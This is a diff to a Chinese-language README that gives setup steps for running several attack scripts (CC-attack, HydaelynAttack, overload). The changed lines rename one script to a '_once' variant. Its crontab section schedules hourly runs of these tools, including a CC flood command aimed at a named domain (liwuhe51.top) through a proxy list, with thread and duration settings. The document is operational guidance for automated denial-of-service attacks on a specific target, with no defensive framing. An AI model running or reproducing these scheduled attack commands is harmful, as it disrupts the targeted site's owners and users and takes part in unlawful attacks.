@@ -69,7 +69,7 @@ python3 ~/overload/overload_p.py
 
 ## 如果要单独性执行HydaelynAttack
 ```shell
-python3 ~/HydaelynAttack/HydaelynAttack_p.py
+python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
 ```
 - HydaelynAttack项目有多个脚本可选，具体看该项目说明
 
@@ -83,7 +83,7 @@ crontab -e
 ## 插入的计划任务
 ```shell
 0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
-15 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p.py
+15 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
 30 * * * * python3 ~/overload/overload_p.py
 ```
 - 编辑完成后按esc退出编辑
